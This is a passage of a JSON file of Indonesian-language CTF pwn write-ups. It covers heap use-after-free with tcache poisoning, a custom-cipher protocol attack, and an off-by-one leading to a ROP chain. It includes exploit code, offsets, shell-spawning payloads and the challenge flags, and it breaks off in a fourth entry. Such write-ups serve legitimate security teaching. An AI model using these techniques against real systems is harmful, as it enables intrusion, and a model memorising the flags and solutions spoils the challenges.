    "description": "Binary wallet memiliki use-after-free pada operasi transfer ledger. Bug tersebut dapat dirangkai dengan safe-linking leak, tcache poisoning, arbitrary read/write, dan overwrite `free@GOT` menjadi `system`.",
    "problemDescription": "Analisis lifecycle wallet dan ledger, buktikan pointer dangling setelah transfer, lalu gunakan primitive heap untuk memperoleh eksekusi command dan membaca flag.",
    "tools": [
      "file",
      "checksec",
      "GDB/pwndbg",
      "pwntools",
      "ELF/GOT analysis",
      "provided libc and loader"
    ],
    "analysis": "Transfer membebaskan `src->ledger` tetapi menyalin pointer yang sama ke wallet tujuan. Pointer dangling memberikan akses ke metadata tcache; setelah key safe-linking diperoleh, tcache diarahkan ke `.bss` untuk membuat fake wallet, leak libc melalui GOT, dan menimpa `free` dengan `system`.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Binary ini adalah challenge pwn heap dengan bug utama di fitur transfer wallet. Saat wallet A ditransfer ke wallet B, program melakukan `free()` terhadap ledger milik wallet A, tetapi pointer ledger yang sudah di-free masih dipasang ke wallet tujuan.\n\nEfeknya, wallet tujuan menyimpan pointer ke chunk heap yang sudah masuk tcache. Pointer ini masih bisa dipakai lewat fitur view/edit, jadi kita mendapat primitive use-after-free untuk membaca dan menulis isi chunk tcache.\n\nExploit akhirnya memakai UAF ini untuk:\n\n1. leak heap safe-linking key dari metadata tcache,\n2. melakukan tcache poisoning,\n3. membuat fake wallet di area `.bss`,\n4. leak alamat `free()` dari GOT,\n5. hitung base libc,\n6. overwrite `free@GOT` menjadi `system`,\n7. trigger `system(\"/bin/sh\")`.\n\nFlag:\n\n```text\nsun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}\n```"
      },
      {
        "title": "File Challenge",
        "content": "File yang dianalisis:\n\n```text\ncache_money\nld-linux-x86-64.so.2\nlibc.so.6\n```\n\n`cache_money` adalah ELF 64-bit dynamically linked. Challenge juga memberi loader dan libc, jadi exploit bisa dibuat stabil terhadap offset libc yang dipakai remote."
      },
      {
        "title": "Analisis Awal",
        "content": "Pemeriksaan awal:\n\n```bash\nfile cache_money\nchecksec --file=./cache_money\nstrings -a ./cache_money | head -n 100\n```\n\nDari hasil enum, binary berisi program menu wallet/ledger. Operasi yang menarik adalah membuat wallet, melihat data wallet, mengedit ledger, transfer, dan menutup wallet.\n\nSecara konsep, objek wallet menyimpan beberapa field seperti nama, balance, dan pointer ledger. Pointer ledger inilah yang akhirnya bisa dikendalikan melalui bug transfer."
      },
      {
        "title": "Analisis Statis dan Dinamis",
        "content": "Bagian penting ada pada fungsi transfer. Alurnya kira-kira seperti ini:\n\n```c\nsrc = wallets[src_idx];\ndst = wallets[dst_idx];\n\nfree(src->ledger);\ndst->ledger = src->ledger;\nsrc->ledger = NULL;\n```\n\nMasalahnya ada pada urutan operasi tersebut. Setelah `free(src->ledger)`, pointer `src->ledger` sudah menunjuk ke chunk yang statusnya bebas. Tetapi nilainya masih disalin ke `dst->ledger`.\n\nArtinya wallet tujuan sekarang punya pointer aktif ke chunk freed.\n\nChunk freed tersebut masuk ke tcache. Ketika chunk ini dilihat atau diedit lewat wallet tujuan, kita sedang membaca atau menulis metadata tcache.\n\nIni memberi dua primitive:\n\n```text\nview ledger  -> leak isi freed chunk / tcache metadata\nedit ledger  -> overwrite isi freed chunk / tcache fd\n```\n\nKarena libc modern memakai safe-linking pada tcache, pointer `fd` tidak disimpan polos. Formatnya:\n\n```c\nencoded_fd = target ^ (chunk_addr >> 12)\n```\n\nJadi exploit harus leak heap terlebih dahulu untuk mendapat key:\n\n```python\nheap_key = freed_chunk_addr >> 12\nencoded = target ^ heap_key\n```\n\nSetelah key diketahui, tcache poisoning bisa dilakukan dengan aman."
      },
      {
        "title": "Algoritma Eksploitasi",
        "content": "Exploit memakai urutan berikut.\n\n### 1. Siapkan wallet dan ledger\n\nBuat beberapa wallet dengan ukuran ledger yang masuk ke tcache. Tujuannya supaya ada chunk yang bisa di-free dan dimanipulasi.\n\n### 2. Trigger use-after-free lewat transfer\n\nTransfer wallet sumber ke wallet tujuan. Fungsi transfer akan melakukan `free(src->ledger)`, lalu pointer ledger yang sudah freed dipasang ke wallet tujuan.\n\nWallet tujuan sekarang menjadi handle UAF.\n\n### 3. Leak heap key\n\nLihat isi ledger wallet tujuan. Karena chunk sudah masuk tcache, data awal chunk berisi metadata tcache. Dari sana exploit mengambil nilai yang cukup untuk menghitung safe-linking key.\n\nSafe-linking key dipakai untuk encode pointer target saat melakukan tcache poisoning.\n\n### 4. Tcache poisoning ke `.bss`\n\nOverwrite `fd` chunk tcache dengan pointer terenkripsi menuju area `.bss` yang berisi array wallet global.\n\nSaat alokasi berikutnya dilakukan, allocator akan mengembalikan chunk pada alamat yang kita arahkan. Dengan ini kita bisa membuat fake wallet atau menimpa struktur wallet yang sudah ada.\n\n### 5. Fake wallet untuk arbitrary read/write\n\nFake wallet dibuat supaya field ledger menunjuk ke alamat yang ingin dibaca atau ditulis. Dengan fitur view/edit ledger, primitive berubah menjadi arbitrary read/write terbatas.\n\nTarget pertama adalah `free@GOT`.\n\n### 6. Leak libc dari GOT\n\nSet fake wallet agar ledger menunjuk ke `free@GOT`, lalu view ledger.\n\nNilai yang dibaca adalah alamat runtime `free()` di libc.\n\nDari alamat ini, base libc dihitung:\n\n```python\nlibc_base = leaked_free - libc.symbols[\"free\"]\nsystem_addr = libc_base + libc.symbols[\"system\"]\n```\n\n### 7. Overwrite `free@GOT` menjadi `system`\n\nSet fake wallet agar ledger menunjuk ke `free@GOT`, lalu edit ledger dengan alamat `system`.\n\nSetelah overwrite ini, setiap pemanggilan `free(ptr)` akan menjadi:\n\n```c\nsystem(ptr)\n```\n\n### 8. Trigger shell\n\nBuat wallet atau ledger berisi string:\n\n```text\n/bin/sh\\x00\n```\n\nLalu tutup/free objek tersebut. Program memanggil `free(\"/bin/sh\")`, tetapi karena GOT sudah dioverwrite, yang dijalankan adalah:\n\n```c\nsystem(\"/bin/sh\")\n```\n\nShell terbuka, lalu flag dibaca dari remote."
      },
      {
        "title": "Penyusunan Solver",
        "content": "`solve.py` dibuat dengan pwntools. Script memakai libc dan loader yang disediakan challenge agar offset sama dengan remote.\n\nMode lokal:\n\n```bash\n./solve.py local\n```\n\nMode remote:\n\n```bash\n./solve.py remote\n```\n\natau langsung:\n\n```bash\n./solve.py\n```\n\nStruktur penting script:\n\n```python\nelf = ELF(\"./cache_money\")\nlibc = ELF(\"./libc.so.6\")\n\nfree_got = elf.got[\"free\"]\nfree_off = libc.symbols[\"free\"]\nsystem_off = libc.symbols[\"system\"]\n```\n\nSetelah leak `free@GOT`, script menghitung alamat `system`, lalu melakukan overwrite GOT dan trigger shell."
      },
      {
        "title": "Flag",
        "content": "Flag yang didapat dari remote:\n\n```text\nsun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}",
    "lessonsLearned": "Perbaiki ownership pointer setelah `free()` dan jangan mempertahankan alias ke chunk yang sudah dibebaskan. Safe-linking hanya mempersulit eksploitasi; ia tidak menghilangkan akar masalah use-after-free."
  },
  {
    "id": "sunshinectf-pwn-code-breaker",
    "title": "Code Breaker",
    "category": "Pwn",
    "difficulty": "Hard",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Service menggunakan protocol terenkripsi dengan S-box dan counter, lalu mengekspos bug heap pada storage key-value. Setelah cipher direkonstruksi, bug use-after-free dapat dipakai untuk tcache poisoning dan overwrite callback.",
    "problemDescription": "Rekonstruksi handshake dan stream cipher dari binary, decode traffic service, lalu eksploitasi bug heap untuk mengubah callback menjadi `system` dan membaca flag.",
    "tools": [
      "file",
      "checksec",
      "readelf",
      "GDB",
      "Python 3",
      "pwntools",
      "custom protocol analysis"
    ],
    "analysis": "S-box diambil dari `.rodata`; key diturunkan dari nonce server dan client, kemudian payload diproses dengan XOR stream berbasis counter. Setelah protocol terbuka, entry yang telah di-free masih dapat diakses sehingga safe-linking key dapat dibocorkan dan callback global diarahkan ke `system@plt`.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "`Code Breaker` adalah challenge pwn/rev dengan dua lapisan utama:\n\n1. custom encrypted protocol,\n2. bug heap pada fitur key-value storage.\n\nService tidak memakai plaintext protocol biasa. Saat connect ke remote, output terlihat seperti byte acak karena hampir semua traffic setelah handshake dienkripsi dengan cipher custom.\n\nSetelah cipher dibongkar, fitur storage di dalam binary bisa diakses. Bug utamanya ada pada fitur share/free yang membuat satu entry masih bisa menunjuk ke chunk heap yang sudah di-free. Dari situ kita dapat use-after-free, leak heap safe-linking key, lalu tcache poisoning.\n\nExploit akhirnya menimpa global callback pointer menjadi `system@plt`, lalu memanggil callback tersebut dengan command untuk membaca flag.\n\nFlag:\n\n```text\nsun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}\n```"
      },
      {
        "title": "File Challenge",
        "content": "File yang dipakai:\n\n```text\ncode_breaker\nld-linux-x86-64.so.2\nlibc.so.6\n```\n\nBinary `code_breaker` adalah ELF 64-bit dynamically linked. Challenge juga menyediakan loader dan libc agar environment lokal sama dengan remote.\n\nEnum awal:\n\n```bash\nfile code_breaker\nchecksec --file=./code_breaker\nstrings -a ./code_breaker | head -n 100\n```\n\nDari enum, binary tidak langsung menampilkan menu. Ketika dijalankan atau di-connect lewat `nc`, output pertama tampak seperti byte random. Ini bukan crash, tapi bagian dari handshake protocol terenkripsi."
      },
      {
        "title": "Analisis Awal",
        "content": "Remote:\n\n```bash\nnc chal.sunshinectf.games 26005\n```\n\nOutput awal terlihat seperti data biner:\n\n```text\n��;!`]^�{(v�U�H\n```\n\nIni memberi petunjuk bahwa service memakai protocol sendiri, bukan line-based menu biasa.\n\nDari static analysis, binary memakai packet dengan format:\n\n```text\nlength_be_2 + payload\n```\n\nDua byte pertama adalah panjang payload dalam big-endian. Payload handshake awal masih plaintext, tapi setelah sesi terbentuk payload dienkripsi."
      },
      {
        "title": "Handshake Protocol",
        "content": "Handshake terdiri dari beberapa tahap.\n\nServer mengirim plaintext packet:\n\n```text\n0x01 || server_nonce_16\n```\n\nClient harus membalas plaintext packet:\n\n```text\n0x02 || client_nonce_16\n```\n\nSetelah itu client dan server sama-sama derive session key 16 byte dari `server_nonce` dan `client_nonce`.\n\nClient lalu mengirim proof terenkripsi:\n\n```text\n0x03 || proof_16\n```\n\nJika proof benar, server membalas:\n\n```text\n0x04 0x00\n```\n\nArtinya session encrypted berhasil dibuat."
      },
      {
        "title": "Custom Cipher",
        "content": "Cipher-nya XOR stream sederhana berbasis S-box dan counter.\n\nS-box berada di `.rodata` binary pada offset sekitar:\n\n```text\n0x2040\n```\n\nUkuran S-box:\n\n```text\n0x100 byte\n```\n\nPayload dienkripsi byte-per-byte:\n\n```python\nout[i] = data[i] ^ SBOX[(counter + i + key[i & 15]) & 0xff]\n```\n\nCounter bertambah sesuai panjang payload. Ada counter berbeda untuk arah kirim dan arah terima.\n\nImplementasi stream cipher:\n\n```python\ndef crypt_stream(data: bytes, key: bytes, counter: int):\n    out = bytearray(data)\n\n    for i in range(len(out)):\n        out[i] ^= SBOX[(counter + i + key[i & 15]) & 0xff]\n\n    return bytes(out), (counter + len(out)) & 0xffffffff\n```\n\nLength prefix 2 byte tidak terenkripsi. Hanya payload yang dienkripsi."
      },
      {
        "title": "Key Derivation",
        "content": "Session key dibuat dari server nonce dan client nonce.\n\nMaterial:\n\n```python\nmaterial = server_nonce + client_nonce\n```\n\nLalu diproses beberapa ronde dengan S-box dan rotate-left 3 bit.\n\nKode derivation:\n\n```python\ndef rol8(x: int, n: int) -> int:\n    return ((x << n) & 0xff) | (x >> (8 - n))\n\n\ndef derive_key(server_nonce: bytes, client_nonce: bytes) -> bytes:\n    material = server_nonce + client_nonce\n    key = bytearray(16)\n\n    off_material = 0\n    off_xor = 0\n\n    for _ in range(4):\n        for j in range(16):\n            x = material[(j + off_xor) & 31] ^ key[j]\n            x = SBOX[x]\n            x ^= material[off_material + j]\n            key[j] = rol8(x, 3)\n\n        off_material += 3\n        off_xor += 8\n\n    return bytes(key)\n```\n\nSetelah key benar, client bisa mengirim command terenkripsi dan membaca response terenkripsi."
      },
      {
        "title": "Command Protocol",
        "content": "Setelah handshake, service menerima beberapa opcode untuk key-value storage.\n\nOpcode penting:\n\n```text\n0x10 = create entry\n0x11 = read entry\n0x12 = write entry\n0x13 = free/delete entry\n0x14 = share entry\n0x15 = call global callback\n0x16 = info/leak global state\n```\n\nResponse biasanya berbentuk:\n\n```text\nopcode || status\n```\n\nStatus `0x00` berarti sukses."
      },
      {
        "title": "Leak PIE dari Opcode 0x16",
        "content": "Opcode `0x16` mengembalikan sebagian global state dari binary.\n\nField pertama yang bocor adalah callback pointer.\n\nCallback pointer awal menunjuk ke fungsi internal di binary. Karena binary PIE, leak ini dipakai untuk menghitung PIE base.\n\nRumus:\n\n```python\ncallback = leaked_qword\npie = callback - 0x1390\n```\n\nSetelah PIE base diketahui, alamat penting bisa dihitung:\n\n```python\nsystem_plt   = pie + 0x1150\ncallback_ptr = pie + 0x40c0\n```\n\n`callback_ptr` adalah slot global yang nanti dioverwrite menjadi `system@plt`."
      },
      {
        "title": "Bug Heap",
        "content": "Bug utama ada pada kombinasi fitur `share` dan `free`.\n\nSecara konsep, fitur `share` membuat dua index menunjuk ke chunk/data yang sama.\n\nContoh:\n\n```text\nentry 0 -> chunk A\nentry 1 -> chunk A\n```\n\nJika entry 1 di-free, chunk A masuk ke tcache. Tapi entry 0 masih menyimpan pointer ke chunk A.\n\nAkibatnya entry 0 menjadi use-after-free handle.\n\nPrimitive yang didapat:\n\n```text\nread entry 0  -> baca isi freed chunk\nwrite entry 0 -> tulis isi freed chunk\n```\n\nKarena freed chunk berada di tcache, isi awal chunk berisi metadata tcache, termasuk `fd` yang terkena safe-linking."
      },
      {
        "title": "Leak Heap Safe-Linking Key",
        "content": "glibc safe-linking menyimpan pointer tcache `fd` dalam bentuk encoded:\n\n```text\nencoded_fd = real_fd ^ (chunk_addr >> 12)\n```\n\nJika `fd` bernilai NULL, nilai encoded yang tersimpan sama dengan:\n\n```text\nchunk_addr >> 12\n```\n\nDengan membaca freed chunk yang `fd`-nya NULL, exploit mendapat heap key:\n\n```python\nheap_key = u64(read_freed_chunk[:8])\n```\n\nHeap key ini dipakai untuk encode target pointer saat melakukan tcache poisoning."
      },
      {
        "title": "Tcache Poisoning",
        "content": "Target overwrite adalah global callback pointer:\n\n```python\ncallback_ptr = pie + 0x40c0\n```\n\nAgar tcache mengembalikan chunk ke alamat tersebut, `fd` chunk tcache dioverwrite dengan:\n\n```python\nencoded_target = callback_ptr ^ heap_key\n```\n\nLalu exploit melakukan dua allocation ukuran sama:\n\n```text\nallocation pertama  -> mengambil chunk asli dari tcache\nallocation kedua    -> mengembalikan pointer ke callback_ptr\n```\n\nKarena allocation kedua menunjuk ke global callback pointer, data yang ditulis ke entry tersebut akan menimpa callback.\n\nNilai yang ditulis:\n\n```python\np64(system_plt)\n```\n\nSetelah itu callback global berubah menjadi `system@plt`."
      },
      {
        "title": "Trigger system(command)",
        "content": "Opcode `0x15` memanggil global callback dengan argumen dari payload command.\n\nSebelum overwrite:\n\n```c\ncallback(command);\n```\n\nSetelah callback dioverwrite:\n\n```c\nsystem(command);\n```\n\nExploit mengirim command:\n\n```bash\ncat flag.txt 2>/dev/null; cat /flag.txt 2>/dev/null; cat flag 2>/dev/null; cat /flag 2>/dev/null\n```\n\nRemote mengeksekusi command tersebut dan mengembalikan flag."
      },
      {
        "title": "Alur Exploit",
        "content": "Urutan exploit:\n\n```text\n1. Connect ke remote.\n2. Terima server hello:\n   0x01 || server_nonce.\n3. Kirim client hello:\n   0x02 || client_nonce.\n4. Derive session key.\n5. Kirim encrypted proof.\n6. Session encrypted aktif.\n7. Kirim opcode 0x16 untuk leak callback pointer.\n8. Hitung PIE base.\n9. Hitung system@plt dan alamat global callback slot.\n10. Buat dua chunk ukuran sama.\n11. Share chunk agar ada dua entry menunjuk ke chunk sama.\n12. Free salah satu alias untuk membuat UAF.\n13. Read alias lain untuk leak heap safe-linking key.\n14. Poison tcache fd ke callback slot.\n15. Allocate dua kali agar allocation kedua jatuh ke callback slot.\n16. Tulis system@plt ke callback slot.\n17. Trigger opcode 0x15 dengan command baca flag.\n18. Flag keluar.\n```"
      },
      {
        "title": "Potongan Kode Penting",
        "content": "Handshake:\n\n```python\nfirst = recv_packet_raw()\nserver_nonce = first[1:]\n\nclient_nonce = b\"C\" * 16\nsend_packet_raw(b\"\\x02\" + client_nonce)\n\nkey = derive_key(server_nonce, client_nonce)\n\nproof = bytes(SBOX[key[i]] ^ key[(i + 5) & 15] for i in range(16))\nsend_packet(b\"\\x03\" + proof)\n\nresp = recv_packet()\nassert resp == b\"\\x04\\x00\"\n```\n\nLeak PIE:\n\n```python\ninfo = cmd_info(t)\ncallback = u64(info[:8])\n\npie = callback - 0x1390\nsystem_plt = pie + 0x1150\ncallback_ptr = pie + 0x40c0\n```\n\nUAF setup:\n\n```python\ncmd_create(t, 0, 0x30, b\"A\" * 0x30)\ncmd_create(t, 2, 0x30, b\"B\" * 0x30)\n\ncmd_share(t, 1, 0)\ncmd_share(t, 3, 2)\n\ncmd_free(t, 1)\ncmd_free(t, 3)\n```\n\nLeak heap key:\n\n```python\nheap_key = u64(cmd_read(t, 0)[:8])\n```\n\nTcache poisoning:\n\n```python\nencoded_target = callback_ptr ^ heap_key\ncmd_write(t, 2, p64(encoded_target))\n\ncmd_create(t, 4, 0x30, b\"D\" * 0x30)\ncmd_create(t, 5, 0x30, p64(system_plt) + b\"E\" * (0x30 - 8))\n```\n\nTrigger:\n\n```python\ncmd_call_raw(t, b\"cat flag.txt 2>/dev/null; cat /flag.txt 2>/dev/null\")\n```"
      },
      {
        "title": "Bukti Validasi",
        "content": "Exploit lokal berhasil mengubah callback menjadi `system@plt`:\n\n```text\n[+] encrypted session established\n[+] callback leak : 0x...\n[+] PIE base      : 0x...\n[+] system@plt    : 0x...\n[+] callback slot : 0x...\n[+] heap key      : 0x...\n[+] tcache fd poisoned\n[+] callback now  : 0x...\n[+] triggering system(command)\n```\n\nRemote menghasilkan flag:\n\n```text\nsun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}\n```"
      },
      {
        "title": "Flag",
        "content": "```text\nsun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}\n```"
      },
      {
        "title": "Black-box scope",
        "content": "The protocol and heap behavior described here were inferred from the supplied binary, local testing, and the remote solver. No server-side source code was available."
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}",
    "lessonsLearned": "Protocol custom perlu diuji layer demi layer: framing, handshake, key derivation, cipher, dan command semantics. Di sisi native code, callback dan object lifetime tetap harus diamankan meskipun traffic sudah dienkripsi."
  },
  {
    "id": "sunshinectf-pwn-homemaker",
    "title": "Homemaker",
    "category": "Pwn",
    "difficulty": "Hard",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Service menerima frame biner bergaya punch card dengan CRC-8 custom. Off-by-one pada handler opcode `0x02` mengubah batas panjang buffer, memungkinkan stack leak dan overflow kedua untuk membangun ROP chain.",
    "problemDescription": "Pahami framing dan checksum service, gunakan korupsi batas panjang untuk memperoleh canary serta PIE leak, lalu pertahankan canary saat mengirim overflow kedua.",
    "tools": [
      "file",
      "checksec",
      "GDB",
      "Python 3",
      "pwntools",
      "CRC-8 analysis"
    ],
    "analysis": "Frame terdiri dari magic, panjang big-endian, payload, CRC-8 polynomial `0x2f`, dan trailer. Payload yang checksum-nya dituning ke `0xff` mengubah `max_len` menjadi `0x01ff`; opcode dump kemudian membocorkan stack canary, saved RBP, dan saved RIP sebelum ROP chain dijalankan.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "`Homemaker` adalah challenge pwn/rev berbasis custom protocol. Binary tidak menampilkan menu biasa, tapi menunggu input berbentuk frame seperti punch card.\n\nRemote awalnya hanya menampilkan banner:\n\n```text\nMODEL 7 \"HOMEMAKER\" DOMESTIC AUTOMATON\nSERVO-COMMAND LINK  ::  REV 3  ::  UNIT VB-04\n\nFILAMENTS WARM. DRUM AT SPEED.\n>> INSERT SERVICE KEY CARD TO CONTINUE <<\n```\n\nService tidak menerima teks biasa. Input harus dikirim dalam format frame khusus:\n\n```text\nESC [ + length + payload + checksum + ESC \\\n```\n\nSetelah protocol dipahami, bug utama ada di handler opcode `0x02`. Ada off-by-one write yang membuat byte checksum ikut tersalin ke state internal program. Byte ini bisa dipakai untuk mengubah batas panjang buffer dari `0x100` menjadi `0x1ff`.\n\nSetelah limit membesar, opcode dump bisa membocorkan stack canary, saved RBP, dan saved RIP. Dari saved RIP kita dapat PIE base. Setelah itu exploit melakukan overflow kedua dengan mempertahankan canary, lalu membuat ROP chain ke `system(\"/bin/sh\")`.\n\nFlag:\n\n```text\nsun{the_future_is_now_today_well_wait_how_are_you_reading_this}\n```"
      },
      {
        "title": "File Challenge",
        "content": "File yang dianalisis:\n\n```text\nhomemaker\n```\n\nBinary merupakan ELF 64-bit stripped dan PIE. Import yang terlihat sedikit, salah satunya `system`, yang akhirnya berguna untuk ROP.\n\nCek awal:\n\n```bash\nfile homemaker\nchecksec --file=./homemaker\nstrings -a ./homemaker | head -n 100\n```\n\nBinary tidak menyimpan flag secara hardcoded. Flag didapat dari remote setelah shell berhasil dibuka."
      },
      {
        "title": "Analisis Awal",
        "content": "Saat binary dijalankan, program menampilkan banner retro bertema automaton rumah tangga. Setelah itu program menunggu “service key card”.\n\nInput seperti `AAAA`, `help`, atau teks biasa tidak menghasilkan progress karena program membaca frame biner, bukan command line biasa.\n\nDari static analysis, parser frame memakai format:\n\n```text\n\\x1b[ + length_be_2 + payload + crc8 + \\x1b\\\n```\n\nKomponen frame:\n\n```text\nmagic      = 0x1b5b\nlength     = 2 byte big-endian\npayload    = command data\nchecksum   = CRC-8 custom\ntrailer    = 0x1b5c\n```\n\nChecksum memakai CRC-8 custom dengan polynomial `0x2f`.\n\nImplementasi checksum:\n\n```python\ndef crc8(data: bytes) -> int:\n    c = 0\n    for b in data:\n        c ^= b\n        for _ in range(8):\n            if c & 0x80:\n                c = ((c << 1) & 0xff) ^ 0x2f\n            else:\n                c = (c << 1) & 0xff\n    return c\n```\n\nFrame builder:\n\n```python\ndef make_frame(payload: bytes) -> bytes:\n    return (\n        b\"\\x1b[\"\n        + len(payload).to_bytes(2, \"big\")\n        + payload\n        + bytes([crc8(payload)])\n        + b\"\\x1b\\\\\"\n    )\n```"
      },
      {
        "title": "Service Key Card",
        "content": "Opcode pertama yang perlu dikirim adalah opcode `0x01`. Handler opcode ini memvalidasi service key.\n\nDari hasil reverse, key yang valid adalah:\n\n```text\n0x1337c35f\n```\n\nKey dikirim big-endian setelah opcode:\n\n```python\npayload = b\"\\x01\" + struct.pack(\">I\", 0x1337c35f)\n```\n\nKalau key benar, response payload dari service adalah:\n\n```text\n00\n```\n\nArtinya service key diterima dan command-command berikutnya bisa dipakai."
      },
      {
        "title": "Analisis Protocol Command",
        "content": "Opcode yang relevan:\n\n```text\n0x01 = submit service key\n0x02 = write/update state buffer\n0x03 = dump/read state buffer\n0x04 = exit/return dari loop command\n```\n\nOpcode `0x02` dipakai untuk menulis data ke buffer internal. Normalnya ukuran buffer dibatasi `0x100`.\n\nOpcode `0x03` mengembalikan isi state buffer. Normalnya hanya mengembalikan data dalam batas aman.\n\nOpcode `0x04` keluar dari loop command. Ini penting karena setelah return, saved RIP yang sudah dioverwrite akan dieksekusi."
      },
      {
        "title": "Bug Utama",
        "content": "Bug ada di handler opcode `0x02`.\n\nProgram memiliki state buffer sekitar `0x100` byte dan field length/max_len setelahnya. Saat menerima payload dengan panjang tertentu, copy berjalan off-by-one sehingga byte checksum dari frame ikut masuk ke state.\n\nEfek pentingnya:\n\n```text\nstate[0x100] = checksum\n```\n\nByte ini adalah low byte dari nilai maksimum panjang buffer.\n\nNilai awal kira-kira:\n\n```text\nmax_len = 0x0100\n```\n\nJika checksum bisa dipaksa menjadi `0xff`, maka limit berubah menjadi:\n\n```text\nmax_len = 0x01ff\n```\n\nJadi bug-nya bukan sekadar overflow langsung, tapi corrupt limit lebih dulu.\n\nUntuk memaksa checksum menjadi `0xff`, script menambahkan satu byte brute force di akhir payload sampai CRC payload menghasilkan nilai yang diinginkan.\n\nKode helper:\n\n```python\ndef tune_last_byte(prefix: bytes, wanted_crc: int) -> bytes:\n    for x in range(256):\n        payload = prefix + bytes([x])\n        if crc8(payload) == wanted_crc:\n            return payload\n\n    raise RuntimeError(\"could not tune crc\")\n```\n\nPayload untuk corrupt limit:\n\n```python\ngrow_payload = tune_last_byte(b\"\\x02\" + b\"A\" * 255, 0xff)\nsend(make_frame(grow_payload))\n```\n\nSetelah frame ini diproses, `max_len` berubah menjadi `0x1ff`."
      },
      {
        "title": "Leak Stack",
        "content": "Setelah `max_len` corrupt, opcode `0x03` bisa membaca lebih jauh dari batas normal buffer.\n\nResponse dari opcode dump berisi state yang melewati area buffer dan masuk ke stack frame. Dari leak ini exploit mengambil:\n\n```text\nstack canary\nsaved RBP\nsaved RIP\n```\n\nOffset yang dipakai di exploit:\n\n```python\ncanary    = int.from_bytes(leak[0x108:0x110], \"little\")\nsaved_rbp = int.from_bytes(leak[0x110:0x118], \"little\")\nsaved_rip = int.from_bytes(leak[0x118:0x120], \"little\")\n```\n\nSaved RIP menunjuk ke alamat dalam binary PIE. Karena offset return site diketahui dari static analysis, PIE base bisa dihitung:\n\n```python\npie = saved_rip - RET_AFTER_LOOP\n```\n\nState buffer berada relatif terhadap saved RBP:\n\n```python\nstate_addr = saved_rbp - 0x130\n```\n\nAlamat ini dipakai untuk menaruh string `/bin/sh`."
      },
      {
        "title": "ROP Chain",
        "content": "Binary memiliki import `system`, jadi tidak perlu leak libc. Cukup panggil `system@plt`.\n\nGadget yang dipakai:\n\n```text\nret\npop rdi ; ret\nsystem@plt\n```\n\nROP chain:\n\n```text\nret\npop rdi ; ret\n&\"/bin/sh\"\nsystem@plt\n```\n\n`ret` tambahan dipakai untuk alignment stack agar call ke `system` lebih stabil.\n\nOffset penting dari binary:\n\n```python\nRET_AFTER_LOOP = 0x1a9f\nPOP_RDI_RET    = 0x12aa\nRET            = 0x101a\nSYSTEM_PLT     = 0x10c0\n```\n\nAlamat runtime dihitung dari PIE base:\n\n```python\npop_rdi    = pie + POP_RDI_RET\nret        = pie + RET\nsystem_plt = pie + SYSTEM_PLT\n```\n\nString `/bin/sh` ditaruh di buffer yang sama:\n\n```python\nbinsh_off = 0x160\nbinsh_addr = state_addr + binsh_off\n```\n\nPayload overflow harus mempertahankan canary dan saved RBP:\n\n```python\ndata[0x108:0x110] = canary.to_bytes(8, \"little\")\ndata[0x110:0x118] = saved_rbp.to_bytes(8, \"little\")\n```\n\nLalu saved RIP diganti dengan ROP chain:\n\n```python\ndata[0x118:0x120] = ret.to_bytes(8, \"little\")\ndata[0x120:0x128] = pop_rdi.to_bytes(8, \"little\")\ndata[0x128:0x130] = binsh_addr.to_bytes(8, \"little\")\ndata[0x130:0x138] = system_plt.to_bytes(8, \"little\")\n```\n\nTerakhir, tulis string command:\n\n```python\ndata[binsh_off:binsh_off + 8] = b\"/bin/sh\\x00\"\n```\n\nSetelah overflow terkirim, exploit mengirim opcode `0x04`. Opcode ini keluar dari loop command, fungsi return, dan eksekusi lompat ke ROP chain."
      },
      {
        "title": "Penyusunan Solver",
        "content": "Alur `solve.py`:\n\n```text\n1. Connect ke remote.\n2. Kirim service key card:\n   opcode 0x01 + 0x1337c35f.\n3. Kirim opcode 0x02 dengan payload yang CRC-nya dipaksa 0xff.\n4. max_len berubah dari 0x100 ke 0x1ff.\n5. Kirim opcode 0x03 untuk leak stack.\n6. Ambil canary, saved RBP, saved RIP.\n7. Hitung PIE base dan alamat state buffer.\n8. Buat payload overflow kedua.\n9. Preserve canary.\n10. Overwrite saved RIP dengan ROP system(\"/bin/sh\").\n11. Kirim opcode 0x04 agar function return.\n12. Shell terbuka.\n13. Baca flag.\n```\n\nCommand untuk menjalankan:\n\n```bash\nchmod +x solve.py\n./solve.py remote\n```\n\nTest lokal:\n\n```bash\n./solve.py local\n```"
      },
      {
        "title": "Bukti Validasi",
        "content": "Exploit lokal berhasil membuka shell:\n\n```text\n[+] service key accepted\n[+] max length corrupted to 0x1ff\n[+] canary    = 0x...\n[+] saved rbp = 0x...\n[+] PIE base  = 0x...\n[+] saved return address overwritten\nPWNED\nuid=...\n```\n\nRemote menghasilkan flag:\n\n```text\nsun{the_future_is_now_today_well_wait_how_are_you_reading_this}\n```"
      },
      {
        "title": "Flag",
        "content": "```text\nsun{the_future_is_now_today_well_wait_how_are_you_reading_this}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{the_future_is_now_today_well_wait_how_are_you_reading_this}",
    "lessonsLearned": "Validasi panjang harus dilakukan sebelum dan sesudah transformasi atau checksum. Korupsi satu byte pada metadata kontrol dapat mengubah bug kecil menjadi primitive memory disclosure dan control-flow hijack."
  },
  {
    "id": "sunshinectf-pwn-mad-libs",
    "title": "Mad Libs",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Binary mencetak input user dengan `printf(buffer)`, sehingga tersedia format-string read/write. Leak alamat dan overwrite GOT digunakan untuk mengganti `printf` dengan `system`.",
